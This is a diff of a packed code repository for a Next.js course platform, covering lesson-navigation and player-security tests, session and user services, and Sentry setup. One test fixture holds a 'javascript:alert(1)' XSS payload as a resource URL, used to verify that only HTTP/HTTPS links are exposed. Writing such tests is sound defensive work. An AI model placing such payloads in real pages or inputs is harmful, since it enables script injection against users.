-  4: import { CourseLevel, CourseStatus } from "@prisma/client";
-  5: jest.mock("@/repositories/course");
-  6: const mockCourseRepo = courseRepository as jest.Mocked<typeof courseRepository>;
-  7: describe("Lesson Content Service - Player Navigation", () => {
-  8:   beforeEach(() => {
-  9:     jest.clearAllMocks();
- 10:   });
- 11:   const mockCourseWithCurriculum = {
- 12:     id: "course-1",
- 13:     title: "Course 1",
- 14:     slug: "course-1",
- 15:     description: "Test Course",
- 16:     thumbnailUrl: null,
- 17:     status: CourseStatus.PUBLISHED,
- 18:     level: CourseLevel.BEGINNER,
- 19:     category: "Dev",
- 20:     instructorId: "inst-1",
- 21:     createdAt: new Date(),
- 22:     updatedAt: new Date(),
- 23:     modules: [
- 24:       {
- 25:         id: "module-1",
- 26:         title: "Module 1",
- 27:         orderIndex: 0,
- 28:         lessons: [
- 29:           { id: "lesson-1", title: "Lesson 1", orderIndex: 0 },
- 30:           { id: "lesson-2", title: "Lesson 2", orderIndex: 1 },
- 31:         ],
- 32:       },
- 33:       {
- 34:         id: "module-2",
- 35:         title: "Module 2",
- 36:         orderIndex: 1,
- 37:         lessons: [
- 38:           { id: "lesson-3", title: "Lesson 3", orderIndex: 0 },
- 39:           { id: "lesson-4", title: "Lesson 4", orderIndex: 1 },
- 40:         ],
- 41:       },
- 42:     ],
- 43:   };
- 44:   it("resolves navigation for the first lesson (no previous lesson)", async () => {
- 45:     mockCourseRepo.findCourseById.mockResolvedValue(
- 46:       mockCourseWithCurriculum as any,
- 47:     );
- 48:     const nav = await getLessonNavigation("course-1", "lesson-1");
- 49:     expect(nav.previousLesson).toBeNull();
- 50:     expect(nav.nextLesson).toEqual({ id: "lesson-2", title: "Lesson 2" });
- 51:     expect(nav.totalLessons).toBe(4);
- 52:     expect(nav.currentIndex).toBe(1);
- 53:   });
- 54:   it("resolves navigation across modules (middle lesson)", async () => {
- 55:     mockCourseRepo.findCourseById.mockResolvedValue(
- 56:       mockCourseWithCurriculum as any,
- 57:     );
- 58:     const nav = await getLessonNavigation("course-1", "lesson-2");
- 59:     expect(nav.previousLesson).toEqual({ id: "lesson-1", title: "Lesson 1" });
- 60:     expect(nav.nextLesson).toEqual({ id: "lesson-3", title: "Lesson 3" });
- 61:     expect(nav.currentIndex).toBe(2);
- 62:   });
- 63:   it("resolves navigation for the last lesson (no next lesson)", async () => {
- 64:     mockCourseRepo.findCourseById.mockResolvedValue(
- 65:       mockCourseWithCurriculum as any,
- 66:     );
- 67:     const nav = await getLessonNavigation("course-1", "lesson-4");
- 68:     expect(nav.previousLesson).toEqual({ id: "lesson-3", title: "Lesson 3" });
- 69:     expect(nav.nextLesson).toBeNull();
- 70:     expect(nav.currentIndex).toBe(4);
- 71:   });
- 72:   it("handles a single-lesson course correctly", async () => {
- 73:     mockCourseRepo.findCourseById.mockResolvedValue({
- 74:       ...mockCourseWithCurriculum,
- 75:       modules: [
- 76:         {
- 77:           id: "mod-1",
- 78:           title: "Mod 1",
- 79:           orderIndex: 0,
- 80:           lessons: [{ id: "solo-lesson", title: "Solo", orderIndex: 0 }],
- 81:         },
- 82:       ],
- 83:     } as any);
- 84:     const nav = await getLessonNavigation("course-1", "solo-lesson");
- 85:     expect(nav.previousLesson).toBeNull();
- 86:     expect(nav.nextLesson).toBeNull();
- 87:     expect(nav.totalLessons).toBe(1);
- 88:     expect(nav.currentIndex).toBe(1);
- 89:   });
- 90:   describe("Security: Cross-Course Navigation Isolation", () => {
- 91:     it("strictly rejects a lesson ID that belongs to another course", async () => {
- 92:       mockCourseRepo.findCourseById.mockResolvedValue(
- 93:         mockCourseWithCurriculum as any,
- 94:       );
- 95:       await expect(
- 96:         getLessonNavigation("course-1", "lesson-from-course-b"),
- 97:       ).rejects.toThrow(NotFoundError);
- 98:       await expect(
- 99:         getLessonNavigation("course-1", "lesson-from-course-b"),
-100:       ).rejects.toThrow("Lesson does not belong to this course");
-101:     });
-102:   });
-103: });
+  3: import type { CourseWithCurriculum } from "@/repositories/course";
+  4: import { NotFoundError } from "@/lib/errors";
+  5: import { CourseLevel, CourseStatus } from "@prisma/client";
+  6: jest.mock("@/repositories/course");
+  7: const mockCourseRepo = courseRepository as jest.Mocked<typeof courseRepository>;
+  8: describe("Lesson Content Service - Player Navigation", () => {
+  9:   beforeEach(() => {
+ 10:     jest.clearAllMocks();
+ 11:   });
+ 12:   const now = new Date();
+ 13:   const mockCourseWithCurriculum: CourseWithCurriculum = {
+ 14:     id: "course-1",
+ 15:     title: "Course 1",
+ 16:     slug: "course-1",
+ 17:     description: "Test Course",
+ 18:     thumbnailUrl: null,
+ 19:     status: CourseStatus.PUBLISHED,
+ 20:     level: CourseLevel.BEGINNER,
+ 21:     category: "Dev",
+ 22:     instructorId: "inst-1",
+ 23:     createdAt: now,
+ 24:     updatedAt: now,
+ 25:     modules: [
+ 26:       {
+ 27:         id: "module-1",
+ 28:         title: "Module 1",
+ 29:         description: null,
+ 30:         courseId: "course-1",
+ 31:         orderIndex: 0,
+ 32:         createdAt: now,
+ 33:         updatedAt: now,
+ 34:         lessons: [
+ 35:           {
+ 36:             id: "lesson-1",
+ 37:             title: "Lesson 1",
+ 38:             slug: "lesson-1",
+ 39:             durationMinutes: null,
+ 40:             moduleId: "module-1",
+ 41:             orderIndex: 0,
+ 42:             isFreePreview: false,
+ 43:             createdAt: now,
+ 44:             updatedAt: now,
+ 45:           },
+ 46:           {
+ 47:             id: "lesson-2",
+ 48:             title: "Lesson 2",
+ 49:             slug: "lesson-2",
+ 50:             durationMinutes: null,
+ 51:             moduleId: "module-1",
+ 52:             orderIndex: 1,
+ 53:             isFreePreview: false,
+ 54:             createdAt: now,
+ 55:             updatedAt: now,
+ 56:           },
+ 57:         ],
+ 58:       },
+ 59:       {
+ 60:         id: "module-2",
+ 61:         title: "Module 2",
+ 62:         description: null,
+ 63:         courseId: "course-1",
+ 64:         orderIndex: 1,
+ 65:         createdAt: now,
+ 66:         updatedAt: now,
+ 67:         lessons: [
+ 68:           {
+ 69:             id: "lesson-3",
+ 70:             title: "Lesson 3",
+ 71:             slug: "lesson-3",
+ 72:             durationMinutes: null,
+ 73:             moduleId: "module-2",
+ 74:             orderIndex: 0,
+ 75:             isFreePreview: false,
+ 76:             createdAt: now,
+ 77:             updatedAt: now,
+ 78:           },
+ 79:           {
+ 80:             id: "lesson-4",
+ 81:             title: "Lesson 4",
+ 82:             slug: "lesson-4",
+ 83:             durationMinutes: null,
+ 84:             moduleId: "module-2",
+ 85:             orderIndex: 1,
+ 86:             isFreePreview: false,
+ 87:             createdAt: now,
+ 88:             updatedAt: now,
+ 89:           },
+ 90:         ],
+ 91:       },
+ 92:     ],
+ 93:   };
+ 94:   it("resolves navigation for the first lesson (no previous lesson)", async () => {
+ 95:     mockCourseRepo.findCourseById.mockResolvedValue(mockCourseWithCurriculum);
+ 96:     const nav = await getLessonNavigation("course-1", "lesson-1");
+ 97:     expect(nav.previousLesson).toBeNull();
+ 98:     expect(nav.nextLesson).toEqual({ id: "lesson-2", title: "Lesson 2" });
+ 99:     expect(nav.totalLessons).toBe(4);
+100:     expect(nav.currentIndex).toBe(1);
+101:   });
+102:   it("resolves navigation across modules (middle lesson)", async () => {
+103:     mockCourseRepo.findCourseById.mockResolvedValue(mockCourseWithCurriculum);
+104:     const nav = await getLessonNavigation("course-1", "lesson-2");
+105:     expect(nav.previousLesson).toEqual({ id: "lesson-1", title: "Lesson 1" });
+106:     expect(nav.nextLesson).toEqual({ id: "lesson-3", title: "Lesson 3" });
+107:     expect(nav.currentIndex).toBe(2);
+108:   });
+109:   it("resolves navigation for the last lesson (no next lesson)", async () => {
+110:     mockCourseRepo.findCourseById.mockResolvedValue(mockCourseWithCurriculum);
+111:     const nav = await getLessonNavigation("course-1", "lesson-4");
+112:     expect(nav.previousLesson).toEqual({ id: "lesson-3", title: "Lesson 3" });
+113:     expect(nav.nextLesson).toBeNull();
+114:     expect(nav.currentIndex).toBe(4);
+115:   });
+116:   it("handles a single-lesson course correctly", async () => {
+117:     mockCourseRepo.findCourseById.mockResolvedValue({
+118:       ...mockCourseWithCurriculum,
+119:       modules: [
+120:         {
+121:           id: "mod-1",
+122:           title: "Mod 1",
+123:           description: null,
+124:           courseId: "course-1",
+125:           orderIndex: 0,
+126:           createdAt: now,
+127:           updatedAt: now,
+128:           lessons: [
+129:             {
+130:               id: "solo-lesson",
+131:               title: "Solo",
+132:               slug: "solo-lesson",
+133:               durationMinutes: null,
+134:               moduleId: "mod-1",
+135:               orderIndex: 0,
+136:               isFreePreview: false,
+137:               createdAt: now,
+138:               updatedAt: now,
+139:             },
+140:           ],
+141:         },
+142:       ],
+143:     });
+144:     const nav = await getLessonNavigation("course-1", "solo-lesson");
+145:     expect(nav.previousLesson).toBeNull();
+146:     expect(nav.nextLesson).toBeNull();
+147:     expect(nav.totalLessons).toBe(1);
+148:     expect(nav.currentIndex).toBe(1);
+149:   });
+150:   describe("Security: Cross-Course Navigation Isolation", () => {
+151:     it("strictly rejects a lesson ID that belongs to another course", async () => {
+152:       mockCourseRepo.findCourseById.mockResolvedValue(mockCourseWithCurriculum);
+153:       await expect(
+154:         getLessonNavigation("course-1", "lesson-from-course-b"),
+155:       ).rejects.toThrow(NotFoundError);
+156:       await expect(
+157:         getLessonNavigation("course-1", "lesson-from-course-b"),
+158:       ).rejects.toThrow("Lesson does not belong to this course");
+159:     });
+160:   });
+161: });
 `````
 
 ## File: src/services/__tests__/player-security.test.ts
 `````typescript
   1: import { getCourseLessonForPlayer } from "../lesson-content";
   2: import * as courseRepository from "@/repositories/course";
-  3: import * as lessonContentRepository from "@/repositories/lesson-content";
-  4: import * as enrollmentService from "@/services/enrollment";
-  5: import * as authorizationService from "@/services/authorization";
-  6: import {
-  7:   AuthenticationError,
-  8:   AuthorizationError,
-  9:   NotFoundError,
- 10: } from "@/lib/errors";
- 11: import { CourseLevel, CourseStatus } from "@prisma/client";
- 12: jest.mock("@/repositories/course");
- 13: jest.mock("@/repositories/lesson-content");
- 14: jest.mock("@/services/enrollment");
- 15: jest.mock("@/services/authorization");
- 16: const mockCourseRepo = courseRepository as jest.Mocked<typeof courseRepository>;
- 17: const mockLessonContentRepo = lessonContentRepository as jest.Mocked<
- 18:   typeof lessonContentRepository
- 19: >;
- 20: const mockEnrollmentService = enrollmentService as jest.Mocked<
- 21:   typeof enrollmentService
- 22: >;
- 23: const mockAuthService = authorizationService as jest.Mocked<
- 24:   typeof authorizationService
- 25: >;
- 26: describe("Player Security & Cross-Course Isolation", () => {
- 27:   beforeEach(() => {
- 28:     jest.clearAllMocks();
- 29:     mockAuthService.hasRole.mockResolvedValue(false);
- 30:   });
- 31:   const courseA = {
- 32:     id: "course-a-id",
- 33:     title: "Course A",
- 34:     slug: "course-a",
- 35:     description: "Course A Description",
- 36:     thumbnailUrl: null,
- 37:     status: CourseStatus.PUBLISHED,
- 38:     level: CourseLevel.BEGINNER,
- 39:     category: "Dev",
- 40:     instructorId: "instructor-a",
- 41:     createdAt: new Date(),
- 42:     updatedAt: new Date(),
- 43:     modules: [
- 44:       {
- 45:         id: "mod-a",
- 46:         orderIndex: 0,
- 47:         lessons: [{ id: "lesson-a", title: "Lesson A", orderIndex: 0 }],
- 48:       },
- 49:     ],
- 50:   };
- 51:   const lessonAHierarchy = {
- 52:     id: "lesson-a",
- 53:     title: "Lesson A",
- 54:     isFreePreview: false,
- 55:     moduleId: "mod-a",
- 56:     module: {
- 57:       id: "mod-a",
- 58:       courseId: "course-a-id",
- 59:       course: {
- 60:         id: "course-a-id",
- 61:         instructorId: "instructor-a",
- 62:         status: CourseStatus.PUBLISHED,
- 63:       },
- 64:     },
- 65:   };
- 66:   const lessonBHierarchy = {
- 67:     id: "lesson-b",
- 68:     title: "Lesson B",
- 69:     isFreePreview: false,
- 70:     moduleId: "mod-b",
- 71:     module: {
- 72:       id: "mod-b",
- 73:       courseId: "course-b-id",
- 74:       course: {
- 75:         id: "course-b-id",
- 76:         instructorId: "instructor-b",
- 77:         status: CourseStatus.PUBLISHED,
- 78:       },
- 79:     },
- 80:   };
- 81:   describe("Mandatory Cross-Course Isolation Guardrail", () => {
- 82:     it("strictly blocks cross-course lesson access when lesson belongs to another course", async () => {
- 83:       mockCourseRepo.findCourseBySlug.mockResolvedValue(courseA as any);
- 84:       mockLessonContentRepo.findLessonHierarchy.mockResolvedValue(
- 85:         lessonBHierarchy as any,
- 86:       );
- 87:       await expect(
- 88:         getCourseLessonForPlayer({
- 89:           courseSlug: "course-a",
- 90:           lessonId: "lesson-b",
- 91:           userId: "student-1",
- 92:         }),
- 93:       ).rejects.toThrow(NotFoundError);
- 94:       await expect(
- 95:         getCourseLessonForPlayer({
- 96:           courseSlug: "course-a",
- 97:           lessonId: "lesson-b",
- 98:           userId: "student-1",
- 99:         }),
-100:       ).rejects.toThrow("Lesson not found in this course");
-101:     });
-102:   });
-103:   describe("Student Access & Authorization Boundary", () => {
-104:     beforeEach(() => {
-105:       mockCourseRepo.findCourseBySlug.mockResolvedValue(courseA as any);
-106:       mockCourseRepo.findCourseById.mockResolvedValue(courseA as any);
-107:       mockLessonContentRepo.findLessonHierarchy.mockResolvedValue(
-108:         lessonAHierarchy as any,
-109:       );
-110:       mockLessonContentRepo.findLessonContentByLessonId.mockResolvedValue({
-111:         id: "content-a",
-112:         lessonId: "lesson-a",
-113:         bodyMarkdown: "# Content",
-114:         bodyHtml: "<p>Content</p>",
-115:         videoUrl: "https://www.youtube.com/embed/dQw4w9WgXcQ",
-116:         resources: [
-117:           { name: "Safe PDF", url: "https://example.com/safe.pdf" },
-118:           { name: "Malicious XSS", url: "javascript:alert(1)" },
-119:         ],
-120:         createdAt: new Date(),
-121:         updatedAt: new Date(),
-122:       });
-123:     });
-124:     it("allows anonymous visitor to view a free preview lesson", async () => {
-125:       mockLessonContentRepo.findLessonHierarchy.mockResolvedValue({
-126:         ...lessonAHierarchy,
-127:         isFreePreview: true,
-128:       } as any);
-129:       const result = await getCourseLessonForPlayer({
-130:         courseSlug: "course-a",
-131:         lessonId: "lesson-a",
-132:         userId: null,
-133:       });
-134:       expect(result.lesson.lessonTitle).toBe("Lesson A");
-135:       expect(result.lesson.isFreePreview).toBe(true);
-136:     });
-137:     it("blocks anonymous visitor from viewing a restricted (non-preview) lesson", async () => {
-138:       await expect(
-139:         getCourseLessonForPlayer({
-140:           courseSlug: "course-a",
-141:           lessonId: "lesson-a",
-142:           userId: null,
-143:         }),
-144:       ).rejects.toThrow(AuthenticationError);
-145:     });
-146:     it("allows an enrolled student to access a restricted lesson", async () => {
-147:       mockEnrollmentService.isUserEnrolled.mockResolvedValue(true);
-148:       const result = await getCourseLessonForPlayer({
-149:         courseSlug: "course-a",
-150:         lessonId: "lesson-a",
-151:         userId: "student-1",
-152:       });
-153:       expect(result.lesson.lessonTitle).toBe("Lesson A");
-154:       expect(result.course.id).toBe("course-a-id");
-155:     });
-156:     it("blocks an unenrolled authenticated user from a restricted lesson", async () => {
-157:       mockEnrollmentService.isUserEnrolled.mockResolvedValue(false);
+  3: import type { CourseWithCurriculum } from "@/repositories/course";
+  4: import * as lessonContentRepository from "@/repositories/lesson-content";
+  5: import type { LessonHierarchy } from "@/repositories/lesson-content";
+  6: import * as enrollmentService from "@/services/enrollment";
+  7: import * as authorizationService from "@/services/authorization";
+  8: import {
+  9:   AuthenticationError,
+ 10:   AuthorizationError,
+ 11:   NotFoundError,
+ 12: } from "@/lib/errors";
+ 13: import { CourseLevel, CourseStatus } from "@prisma/client";
+ 14: jest.mock("@/repositories/course");
+ 15: jest.mock("@/repositories/lesson-content");
+ 16: jest.mock("@/services/enrollment");
+ 17: jest.mock("@/services/authorization");
+ 18: const mockCourseRepo = courseRepository as jest.Mocked<typeof courseRepository>;
+ 19: const mockLessonContentRepo = lessonContentRepository as jest.Mocked<
+ 20:   typeof lessonContentRepository
+ 21: >;
+ 22: const mockEnrollmentService = enrollmentService as jest.Mocked<
+ 23:   typeof enrollmentService
+ 24: >;
+ 25: const mockAuthService = authorizationService as jest.Mocked<
+ 26:   typeof authorizationService
+ 27: >;
+ 28: describe("Player Security & Cross-Course Isolation", () => {
+ 29:   beforeEach(() => {
+ 30:     jest.clearAllMocks();
+ 31:     mockAuthService.hasRole.mockResolvedValue(false);
+ 32:   });
+ 33:   const now = new Date();
+ 34:   const courseA: CourseWithCurriculum = {
+ 35:     id: "course-a-id",
+ 36:     title: "Course A",
+ 37:     slug: "course-a",
+ 38:     description: "Course A Description",
+ 39:     thumbnailUrl: null,
+ 40:     status: CourseStatus.PUBLISHED,
+ 41:     level: CourseLevel.BEGINNER,
+ 42:     category: "Dev",
+ 43:     instructorId: "instructor-a",
+ 44:     createdAt: now,
+ 45:     updatedAt: now,
+ 46:     modules: [
+ 47:       {
+ 48:         id: "mod-a",
+ 49:         title: "Module A",
+ 50:         description: null,
+ 51:         courseId: "course-a-id",
+ 52:         orderIndex: 0,
+ 53:         createdAt: now,
+ 54:         updatedAt: now,
+ 55:         lessons: [
+ 56:           {
+ 57:             id: "lesson-a",
+ 58:             title: "Lesson A",
+ 59:             slug: "lesson-a",
+ 60:             durationMinutes: null,
+ 61:             moduleId: "mod-a",
+ 62:             orderIndex: 0,
+ 63:             isFreePreview: false,
+ 64:             createdAt: now,
+ 65:             updatedAt: now,
+ 66:           },
+ 67:         ],
+ 68:       },
+ 69:     ],
+ 70:   };
+ 71:   const lessonAHierarchy: LessonHierarchy = {
+ 72:     id: "lesson-a",
+ 73:     title: "Lesson A",
+ 74:     isFreePreview: false,
+ 75:     moduleId: "mod-a",
+ 76:     module: {
+ 77:       id: "mod-a",
+ 78:       courseId: "course-a-id",
+ 79:       course: {
+ 80:         id: "course-a-id",
+ 81:         instructorId: "instructor-a",
+ 82:         status: CourseStatus.PUBLISHED,
+ 83:       },
+ 84:     },
+ 85:   };
+ 86:   const lessonBHierarchy: LessonHierarchy = {
+ 87:     id: "lesson-b",
+ 88:     title: "Lesson B",
+ 89:     isFreePreview: false,
+ 90:     moduleId: "mod-b",
+ 91:     module: {
+ 92:       id: "mod-b",
+ 93:       courseId: "course-b-id",
+ 94:       course: {
+ 95:         id: "course-b-id",
+ 96:         instructorId: "instructor-b",
+ 97:         status: CourseStatus.PUBLISHED,
+ 98:       },
+ 99:     },
+100:   };
+101:   describe("Mandatory Cross-Course Isolation Guardrail", () => {
+102:     it("strictly blocks cross-course lesson access when lesson belongs to another course", async () => {
+103:       mockCourseRepo.findCourseBySlug.mockResolvedValue(courseA);
+104:       mockLessonContentRepo.findLessonHierarchy.mockResolvedValue(
+105:         lessonBHierarchy,
+106:       );
+107:       await expect(
+108:         getCourseLessonForPlayer({
+109:           courseSlug: "course-a",
+110:           lessonId: "lesson-b",
+111:           userId: "student-1",
+112:         }),
+113:       ).rejects.toThrow(NotFoundError);
+114:       await expect(
+115:         getCourseLessonForPlayer({
+116:           courseSlug: "course-a",
+117:           lessonId: "lesson-b",
+118:           userId: "student-1",
+119:         }),
+120:       ).rejects.toThrow("Lesson not found in this course");
+121:     });
+122:   });
+123:   describe("Student Access & Authorization Boundary", () => {
+124:     beforeEach(() => {
+125:       mockCourseRepo.findCourseBySlug.mockResolvedValue(courseA);
+126:       mockCourseRepo.findCourseById.mockResolvedValue(courseA);
+127:       mockLessonContentRepo.findLessonHierarchy.mockResolvedValue(
+128:         lessonAHierarchy,
+129:       );
+130:       mockLessonContentRepo.findLessonContentByLessonId.mockResolvedValue({
+131:         id: "content-a",
+132:         lessonId: "lesson-a",
+133:         bodyMarkdown: "# Content",
+134:         bodyHtml: "<p>Content</p>",
+135:         videoUrl: "https://www.youtube.com/embed/dQw4w9WgXcQ",
+136:         resources: [
+137:           { name: "Safe PDF", url: "https://example.com/safe.pdf" },
+138:           { name: "Malicious XSS", url: "javascript:alert(1)" },
+139:         ],
+140:         createdAt: new Date(),
+141:         updatedAt: new Date(),
+142:       });
+143:     });
+144:     it("allows anonymous visitor to view a free preview lesson", async () => {
+145:       mockLessonContentRepo.findLessonHierarchy.mockResolvedValue({
+146:         ...lessonAHierarchy,
+147:         isFreePreview: true,
+148:       });
+149:       const result = await getCourseLessonForPlayer({
+150:         courseSlug: "course-a",
+151:         lessonId: "lesson-a",
+152:         userId: null,
+153:       });
+154:       expect(result.lesson.lessonTitle).toBe("Lesson A");
+155:       expect(result.lesson.isFreePreview).toBe(true);
+156:     });
+157:     it("blocks anonymous visitor from viewing a restricted (non-preview) lesson", async () => {
 158:       await expect(
 159:         getCourseLessonForPlayer({
 160:           courseSlug: "course-a",
 161:           lessonId: "lesson-a",
-162:           userId: "student-1",
+162:           userId: null,
 163:         }),
-164:       ).rejects.toThrow(AuthorizationError);
+164:       ).rejects.toThrow(AuthenticationError);
 165:     });
-166:     it("denies student access to an ARCHIVED course even if enrolled", async () => {
-167:       mockCourseRepo.findCourseBySlug.mockResolvedValue({
-168:         ...courseA,
-169:         status: CourseStatus.ARCHIVED,
-170:       } as any);
-171:       mockEnrollmentService.isUserEnrolled.mockResolvedValue(true);
-172:       await expect(
-173:         getCourseLessonForPlayer({
-174:           courseSlug: "course-a",
-175:           lessonId: "lesson-a",
-176:           userId: "student-1",
-177:         }),
-178:       ).rejects.toThrow(NotFoundError);
-179:     });
-180:     it("allows the authoring instructor to access their own archived course", async () => {
-181:       mockCourseRepo.findCourseBySlug.mockResolvedValue({
-182:         ...courseA,
-183:         status: CourseStatus.ARCHIVED,
-184:       } as any);
-185:       const result = await getCourseLessonForPlayer({
-186:         courseSlug: "course-a",
-187:         lessonId: "lesson-a",
-188:         userId: "instructor-a",
-189:       });
-190:       expect(result.lesson.lessonTitle).toBe("Lesson A");
-191:     });
-192:     it("allows an admin to access any course lesson unconditionally", async () => {
-193:       mockCourseRepo.findCourseBySlug.mockResolvedValue({
-194:         ...courseA,
-195:         status: CourseStatus.DRAFT,
-196:       } as any);
-197:       mockAuthService.hasRole.mockResolvedValue(true);
-198:       const result = await getCourseLessonForPlayer({
-199:         courseSlug: "course-a",
-200:         lessonId: "lesson-a",
-201:         userId: "admin-1",
-202:       });
-203:       expect(result.lesson.lessonTitle).toBe("Lesson A");
-204:     });
-205:     it("sanitizes resources to ensure only HTTP/HTTPS protocols are exposed", async () => {
-206:       mockEnrollmentService.isUserEnrolled.mockResolvedValue(true);
-207:       const result = await getCourseLessonForPlayer({
-208:         courseSlug: "course-a",
-209:         lessonId: "lesson-a",
-210:         userId: "student-1",
-211:       });
-212:       expect(result.lesson.resources).toHaveLength(1);
-213:       expect(result.lesson.resources[0]).toEqual({
-214:         name: "Safe PDF",
-215:         url: "https://example.com/safe.pdf",
+166:     it("allows an enrolled student to access a restricted lesson", async () => {
+167:       mockEnrollmentService.isUserEnrolled.mockResolvedValue(true);
+168:       const result = await getCourseLessonForPlayer({
+169:         courseSlug: "course-a",
+170:         lessonId: "lesson-a",
+171:         userId: "student-1",
+172:       });
+173:       expect(result.lesson.lessonTitle).toBe("Lesson A");
+174:       expect(result.course.id).toBe("course-a-id");
+175:     });
+176:     it("blocks an unenrolled authenticated user from a restricted lesson", async () => {
+177:       mockEnrollmentService.isUserEnrolled.mockResolvedValue(false);
+178:       await expect(
+179:         getCourseLessonForPlayer({
+180:           courseSlug: "course-a",
+181:           lessonId: "lesson-a",
+182:           userId: "student-1",
+183:         }),
+184:       ).rejects.toThrow(AuthorizationError);
+185:     });
+186:     it("denies student access to an ARCHIVED course even if enrolled", async () => {
+187:       mockCourseRepo.findCourseBySlug.mockResolvedValue({
+188:         ...courseA,
+189:         status: CourseStatus.ARCHIVED,
+190:       });
+191:       mockEnrollmentService.isUserEnrolled.mockResolvedValue(true);
+192:       await expect(
+193:         getCourseLessonForPlayer({
+194:           courseSlug: "course-a",
+195:           lessonId: "lesson-a",
+196:           userId: "student-1",
+197:         }),
+198:       ).rejects.toThrow(NotFoundError);
+199:     });
+200:     it("allows the authoring instructor to access their own archived course", async () => {
+201:       mockCourseRepo.findCourseBySlug.mockResolvedValue({
+202:         ...courseA,
+203:         status: CourseStatus.ARCHIVED,
+204:       });
+205:       const result = await getCourseLessonForPlayer({
+206:         courseSlug: "course-a",
+207:         lessonId: "lesson-a",
+208:         userId: "instructor-a",
+209:       });
+210:       expect(result.lesson.lessonTitle).toBe("Lesson A");
+211:     });
+212:     it("allows an admin to access any course lesson unconditionally", async () => {
+213:       mockCourseRepo.findCourseBySlug.mockResolvedValue({
+214:         ...courseA,
+215:         status: CourseStatus.DRAFT,
 216:       });
-217:     });
-218:   });
-219: });
+217:       mockAuthService.hasRole.mockResolvedValue(true);
+218:       const result = await getCourseLessonForPlayer({
+219:         courseSlug: "course-a",
+220:         lessonId: "lesson-a",
+221:         userId: "admin-1",
+222:       });
+223:       expect(result.lesson.lessonTitle).toBe("Lesson A");
+224:     });
+225:     it("sanitizes resources to ensure only HTTP/HTTPS protocols are exposed", async () => {
+226:       mockEnrollmentService.isUserEnrolled.mockResolvedValue(true);
+227:       const result = await getCourseLessonForPlayer({
+228:         courseSlug: "course-a",
+229:         lessonId: "lesson-a",
+230:         userId: "student-1",
+231:       });
+232:       expect(result.lesson.resources).toHaveLength(1);
+233:       expect(result.lesson.resources[0]).toEqual({
+234:         name: "Safe PDF",
+235:         url: "https://example.com/safe.pdf",
+236:       });
+237:     });
+238:   });
+239: });
 `````
 
 ## File: src/services/__tests__/profile.test.ts
@@ -21755,6 +23576,105 @@ tsconfig.json
 157: }
 `````
 
+## File: src/services/session.ts
+`````typescript
+ 1: import * as sessionRepository from "@/repositories/session";
+ 2: import { NotFoundError } from "@/lib/errors";
+ 3: export async function getSessionByToken(token: string) {
+ 4:   const session = await sessionRepository.findSessionByToken(token);
+ 5:   if (!session) {
+ 6:     throw new NotFoundError("Session not found");
+ 7:   }
+ 8:   return session;
+ 9: }
+10: export async function getUserSessions(userId: string) {
+11:   return sessionRepository.findSessionsByUserId(userId);
+12: }
+13: export async function revokeSession(sessionId: string) {
+14:   return sessionRepository.deleteSession(sessionId);
+15: }
+16: export async function revokeAllUserSessions(userId: string) {
+17:   return sessionRepository.deleteSessionsByUserId(userId);
+18: }
+19: export async function revokeExpiredSessions() {
+20:   return sessionRepository.deleteExpiredSessions();
+21: }
+22: export async function isSessionValid(session: {
+23:   expiresAt: Date;
+24: }): Promise<boolean> {
+25:   return session.expiresAt > new Date();
+26: }
+`````
+
+## File: src/services/user.ts
+`````typescript
+ 1: import * as userRepository from "@/repositories/user";
+ 2: import { NotFoundError } from "@/lib/errors";
+ 3: export async function getUserById(id: string) {
+ 4:   const user = await userRepository.findUserById(id);
+ 5:   if (!user) {
+ 6:     throw new NotFoundError("User not found");
+ 7:   }
+ 8:   return user;
+ 9: }
+10: export async function getUserByEmail(email: string) {
+11:   return userRepository.findUserByEmail(email);
+12: }
+13: export async function createUser(data: { email: string; name?: string }) {
+14:   const existing = await userRepository.findUserByEmail(data.email);
+15:   if (existing) {
+16:     throw new Error("Email already in use");
+17:   }
+18:   return userRepository.createUser(data);
+19: }
+20: export async function updateUser(
+21:   id: string,
+22:   data: { name?: string; image?: string },
+23: ) {
+24:   const user = await userRepository.findUserById(id);
+25:   if (!user) {
+26:     throw new NotFoundError("User not found");
+27:   }
+28:   return userRepository.updateUser(id, data);
+29: }
+30: export async function deleteUser(id: string) {
+31:   const user = await userRepository.findUserById(id);
+32:   if (!user) {
+33:     throw new NotFoundError("User not found");
+34:   }
+35:   return userRepository.deleteUser(id);
+36: }
+`````
+
+## File: src/instrumentation-client.ts
+`````typescript
+ 1: import * as Sentry from "@sentry/nextjs";
+ 2: Sentry.init({
+ 3:   dsn: process.env.NEXT_PUBLIC_SENTRY_DSN,
+ 4:   integrations: [Sentry.replayIntegration()],
+ 5:   tracesSampleRate: 1,
+ 6:   replaysSessionSampleRate: 0.1,
+ 7:   replaysOnErrorSampleRate: 1.0,
+ 8:   dataCollection: {
+ 9:   },
+10: });
+11: export const onRouterTransitionStart = Sentry.captureRouterTransitionStart;
+`````
+
+## File: src/instrumentation.ts
+`````typescript
+ 1: import * as Sentry from "@sentry/nextjs";
+ 2: export async function register() {
+ 3:   if (process.env.NEXT_RUNTIME === "nodejs") {
+ 4:     await import("../sentry.server.config");
+ 5:   }
+ 6:   if (process.env.NEXT_RUNTIME === "edge") {
+ 7:     await import("../sentry.edge.config");
+ 8:   }
+ 9: }
+10: export const onRequestError = Sentry.captureRequestError;
+`````
+
 ## File: biome.json
 `````json
  1: {
@@ -21809,7 +23729,7 @@ tsconfig.json
 50:   "linter": {
 51:     "enabled": true,
 52:     "rules": {
-53:       "recommended": true,
+53:       "preset": "recommended",
 54:       "correctness": {
 55:         "noUnusedVariables": "warn"
 56:       },
@@ -21841,1025 +23761,54 @@ tsconfig.json
 82: }
 `````
 
-## File: .agents/rules/graphify.md
-`````markdown
- 1: ---
- 2: trigger: always_on
- 3: description: Consult the graphify knowledge graph at graphify-out/ for codebase and architecture questions.
- 4: ---
- 5: 
- 6: ## graphify
- 7: 
- 8: This project has a graphify knowledge graph at graphify-out/.
- 9: 
-10: Rules:
-11: 
-12: - For codebase or architecture questions, when `graphify-out/graph.json` exists, first run `graphify query "<question>"` (CLI) or `query_graph` (MCP). Use `graphify path "<A>" "<B>"` / `shortest_path` for relationships and `graphify explain "<concept>"` / `get_node` for focused concepts. These return a scoped subgraph, usually much smaller than `GRAPH_REPORT.md` or raw grep output.
-13: - If graphify-out/wiki/index.md exists, navigate it instead of reading raw files
-14: - Read graphify-out/GRAPH_REPORT.md only for broad architecture review or when query/path/explain do not surface enough context
-15: - After modifying code files in this session, run `graphify update .` to keep the graph current (AST-only, no API cost)
+## File: postcss.config.mjs
+`````javascript
+1: const config = {
+2:   plugins: {
+3:     "@tailwindcss/postcss": {},
+4:   },
+5: };
